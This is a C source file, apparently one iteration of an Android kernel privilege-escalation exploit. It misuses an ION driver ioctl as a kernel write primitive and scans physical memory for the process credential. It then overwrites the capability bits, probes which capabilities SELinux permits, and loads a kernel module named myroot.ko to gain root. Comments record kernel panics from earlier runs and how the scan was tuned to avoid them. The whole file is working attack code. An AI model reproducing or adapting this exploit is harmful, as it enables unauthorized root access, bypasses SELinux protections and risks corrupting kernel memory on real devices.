/* k169: locate the credential while the ION buffer count is still small, then grow it.
 *
 * The empirical rule from the last ten runs is exact:
 *
 *     one probe per 192-byte slot over 2 GB      survives  (k144, k145, k166)
 *     two or more probes per slot                panics   (k167, k168)
 *
 * A probe costs a four-byte write whenever it succeeds, so a two-field test doubles the
 * number of writes into structures that are not credentials. One probe it is.
 *
 * The other lesson is about density. k166 saw 3659 uid words instead of k145's 147, because
 * it had allocated 537 ION buffers and every ion_handle carries an id from an idr that
 * starts at 1 - so handle ids in the low thousands sit exactly where the fd alphabet test
 * looks. The credential was past the cut.
 *
 * Both problems disappear if the phases are ordered by buffer count:
 *
 *     PHASE 1  with only 17 buffers, scan once per slot and keep every hit (about 150)
 *     PHASE 2  bind fd 0 to the bit-16 buffer, walk the hits, confirm with capget
 *     PHASE 3  only now allocate 500 more buffers to reach the higher bits, and store at
 *              the address phase 2 already established - no further scanning at all
 *
 * Phase 3 is the measurement that has never completed: which capabilities this domain can
 * actually use. It needs no scan, so it cannot corrupt anything it has not already written.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/ptrace.h>
#include <sys/mman.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_handle_data { s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };

#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_FREE   _IOWR(ION_TYPE, 1, struct ion_handle_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)

struct cap_hdr { u32 version; int pid; };
struct cap_data { u32 eff, prm, inh; };

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART 0x01000000ULL
#define PGSZ 4096
#define NBUF 17
#define NEXTRA 640
#define BASE_FD 2000
#define ION_SLOT 3000
#define NSLOT 21
#define OBJSZ 192
#define MAXHIT 4096
#define SCAN_LO 0x02000000u
#define SCAN_HI 0x7f000000u

static FILE *LOG;
static int ionfd;
static void say(const char *fmt, ...){
    char b[300]; va_list ap; va_start(ap, fmt);
    vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int gate(u64 a){
    struct ion_custom_data cd; cd.cmd = ION_IOC_PHYS; cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}
static int mk_raw(int *h, int *f, u32 *iv){
    struct ion_allocation_data a;
    memset(&a, 0, sizeof a);
    a.len = PGSZ; a.heap_id_mask = 1u << 0; a.flags = ION_FLAG_CACHED;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;
    struct ion_fd_data d; memset(&d, 0, sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;
    *h = a.handle; *f = d.fd;
    if (iv){
        struct ion_phys_data p; memset(&p, 0, sizeof p);
        p.fd = d.fd; p.flags = ION_BUFFER_TYPE_DMA;
        *iv = (ioctl(ionfd, ION_IOC_PHYS, &p) == 0) ? p.addr : 0;
    }
    return 1;
}
static u32 eff_of(int pid){
    struct cap_hdr hh; struct cap_data dd[2];
    memset(&hh, 0, sizeof hh); memset(dd, 0, sizeof dd);
    hh.version = 0x20080522; hh.pid = pid;
    if (syscall(SYS_capget, &hh, dd) < 0) return 0xFFFFFFFFu;
    return dd[0].eff;
}

static int test_cap(int bit)
{
    switch (bit){
    case 13: { int s = socket(AF_INET, SOCK_RAW, 1);
               if (s < 0) return errno; close(s); return 0; }
    case 14: { void *m = mmap(NULL, 1<<20, PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
               if (m == MAP_FAILED) return errno;
               if (mlock(m, 1<<20)) return errno; return 0; }
    case 16: { static const char j[4] = { 0x7f,'E','L','F' };
               syscall(105, j, 4UL, ""); return errno; }
    case 18: { if (chroot("/data/local/tmp")) return errno; return 0; }
    case 19: { if (ptrace(PTRACE_ATTACH, 1, NULL, NULL)) return errno; return 0; }
    case 20: { if (acct("/data/local/tmp/k169.acct")) return errno; return 0; }
    case 21: { if (sethostname("k169probe", 9)) return errno; return 0; }
    case 23: { if (setpriority(PRIO_PROCESS, 1, -5)) return errno; return 0; }
    default: return -1;
    }
}
static int run_test(int bit)
{
    int p[2]; if (pipe(p)) return -2;
    pid_t c = fork();
    if (c == 0){
        close(p[0]);
        int e = test_cap(bit);
        ssize_t w = write(p[1], &e, sizeof e); (void)w;
        close(p[1]); _exit(0);
    }
    close(p[1]);
    int e = -3;
    ssize_t r = read(p[0], &e, sizeof e);
    close(p[0]);
    int st; waitpid(c, &st, 0);
    return r == (ssize_t)sizeof e ? e : -4;
}

int main(void){
    LOG = fopen("/data/local/tmp/k169.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    say("k169 pid=%d uid=%d\n", getpid(), getuid());
    say("locate with 17 buffers, grow afterwards: one probe per slot only\n");
    say("capget before: 0x%08x\n", eff_of(0));

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0){
        rl.rlim_cur = rl.rlim_max; setrlimit(RLIMIT_NOFILE, &rl);
    }
    int raw = open("/dev/ion", O_RDWR);
    if (raw < 0){ say("open errno=%d\n", errno); return 0; }
    ionfd = fcntl(raw, F_DUPFD, ION_SLOT);
    if (ionfd < 0) ionfd = raw; else close(raw);
    say("ionfd=%d\n", ionfd);

    /* pad, then exactly 17 buffers => fd 2000..2016 */
    static int pad[4096]; int npp = 0;
    while (npp < 4090){
        int fd = open("/dev/null", O_RDONLY);
        if (fd < 0) break;
        pad[npp++] = fd;
        if (fd >= BASE_FD - 1) break;
    }
    if (!npp || pad[npp-1] != BASE_FD - 1){ say("pad stopped at %d\n", npp?pad[npp-1]:-1); return 0; }

    static int bh[NBUF], bf[NBUF]; static u32 biv[NBUF]; int nb = 0;
    for (int i = 0; i < NBUF; i++){
        int h, f; u32 iv = 0;
        if (!mk_raw(&h, &f, &iv)) break;
        bh[nb] = h; bf[nb] = f; biv[nb] = iv; nb++;
    }
    if (nb < NBUF){ say("only %d buffers\n", nb); return 0; }
    say("17 buffers fd %d..%d iova 0x%08x..0x%08x\n", bf[0], bf[nb-1], biv[0], biv[nb-1]);
    int i16 = -1;
    for (int i = 0; i < nb; i++) if ((biv[i] >> 16) & 1){ i16 = i; break; }
    say("bit16 index=%d iova=0x%08x\n", i16, i16 >= 0 ? biv[i16] : 0);
    if (i16 < 0) return 0;

    /* PHASE 1: one probe per slot, keep everything */
    say("--- phase 1: single-probe scan ---\n");
    static u64 hits[MAXHIT]; int nhit = 0; long uidhits = 0;
    long pages = 0;
    for (u32 p = SCAN_LO; p < SCAN_HI; p += PGSZ){
        pages++;
        u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
        for (int i = 0; i < NSLOT; i++){
            u64 o = pg + (u64)i * OBJSZ;
            if ((size_t)i * OBJSZ + 132 > PGSZ) break;
            if (gate(o + 4) != 0) continue;
            uidhits++;
            if (nhit < MAXHIT) hits[nhit++] = o;
        }
        if ((pages & 0x3ffff) == 0)
            say("  phys 0x%08x pages=%ld hits=%ld\n", p, pages, uidhits);
    }
    say("  uid_hits=%ld kept=%d pages=%ld\n", uidhits, nhit, pages);
    if (!nhit) return 0;

    /* PHASE 2: find ours via bit 31 */
    say("--- phase 2: identify our credential ---\n");
    if (dup2(bf[i16], 0) < 0){ say("dup2 errno=%d\n", errno); return 0; }
    u64 mycred = 0; int stores = 0;
    for (int i = 0; i < nhit && !mycred; i++){
        u64 o = hits[i];
        if (gate(o + 52) != 0) continue;
        stores++;
        u32 e = eff_of(0);
        if (e != 0xFFFFFFFFu && (e & 0x80000000u)){
            mycred = o;
            say("  ours at 0x%llx after %d stores, eff=0x%08x\n",
                (unsigned long long)o, stores, e);
        }
    }
    say("  stores=%d\n", stores);
    if (!mycred){ say("  not identified among %d\n", nhit); return 0; }

    /* PHASE 3: grow the buffer set, then sweep with single stores */
    say("--- phase 3: allocate %d more buffers for the higher bits ---\n", NEXTRA);
    static int xh[NEXTRA], xf[NEXTRA]; static u32 xiv[NEXTRA]; int nx = 0;
    for (int i = 0; i < NEXTRA; i++){
        int h, f; u32 iv = 0;
        if (!mk_raw(&h, &f, &iv)){ say("  stopped at %d errno=%d\n", i, errno); break; }
        xh[nx] = h; xf[nx] = f; xiv[nx] = iv; nx++;
    }
    say("  %d extra, last iova 0x%08x\n", nx, nx?xiv[nx-1]:0);

    int bfd[32]; for (int b = 0; b < 32; b++) bfd[b] = -1;
    for (int i = 0; i < nb; i++)
        for (int b = 10; b < 32; b++)
            if (((biv[i] >> b) & 1) && bfd[b] < 0) bfd[b] = bf[i];
    for (int i = 0; i < nx; i++)
        for (int b = 10; b < 32; b++)
            if (((xiv[i] >> b) & 1) && bfd[b] < 0) bfd[b] = xf[i];

    say("--- sweep ---\n");
    static const struct { int bit; const char *name; } caps[] = {
        { 13, "NET_RAW" }, { 14, "IPC_LOCK" }, { 16, "SYS_MODULE" },
        { 18, "SYS_CHROOT" }, { 19, "SYS_PTRACE" }, { 20, "SYS_PACCT" },
        { 21, "SYS_ADMIN" }, { 23, "SYS_NICE" }, { 31, "SETFCAP" },
    };
    int allowed = 0, denied = 0;
    for (unsigned i = 0; i < sizeof caps/sizeof caps[0]; i++){
        int b = caps[i].bit;
        if (bfd[b] < 0){ say("  cap %-2d %-10s no buffer\n", b, caps[i].name); continue; }
        if (dup2(bfd[b], 0) < 0){ say("  cap %-2d dup2 failed\n", b); continue; }
        if (gate(mycred + 52) != 0){
            say("  cap %-2d %-10s store refused\n", b, caps[i].name); continue;
        }
        u32 e = eff_of(0);
        int held = (e != 0xFFFFFFFFu) && ((e >> b) & 1);
        int te = run_test(b);
        int ok = (b == 16) ? (te == 8) : (te == 0);
        if (!held) say("  cap %-2d %-10s NOT HELD (eff=0x%08x)\n", b, caps[i].name, e);
        else if (ok){ allowed++; say("  cap %-2d %-10s ALLOWED\n", b, caps[i].name); }
        else { denied++; say("  cap %-2d %-10s denied errno=%d\n", b, caps[i].name, te); }
    }
    say("--- conclusion ---\n  allowed=%d denied=%d\n", allowed, denied);
    if (allowed){
        say("  the denial is per-capability; SELinux allows %d of the tested set\n", allowed);
    } else {
        say("  every capability tested was denied. The SELinux capability class rejects\n");
        say("  this domain wholesale, so rewriting the credential is not enough and the\n");
        say("  escalation must disable the policy check itself rather than the credential\n");
    }

    /* if sys_module passed, load the module */
    if (bfd[16] >= 0 && dup2(bfd[16], 0) >= 0 && gate(mycred + 52) == 0){
        static const char j[4] = { 0x7f,'E','L','F' };
        errno = 0; syscall(105, j, 4UL, "");
        say("--- 4-byte module errno=%d\n", errno);
        if (errno == 8){
            int fd = open("/data/local/tmp/myroot.ko", O_RDONLY);
            if (fd >= 0){
                char *mod = malloc(1 << 20);
                ssize_t got = read(fd, mod, 1 << 20);
                close(fd);
                dup2(bfd[16], 0); gate(mycred + 52);
                errno = 0;
                long rc = syscall(105, mod, (unsigned long)got, "");
                say("  real module rc=%ld errno=%d\n", rc, errno);
                if (access("/proc/myroot", W_OK) == 0){
                    int p = open("/proc/myroot", O_WRONLY);
                    if (p >= 0){ if (write(p, "1", 1) == 1) say("  ROOT\n"); close(p); }
                }
            }
        }
    }
    say("  final capget 0x%08x\n", eff_of(0));
    say("K169 done\n");
    return 0;
}
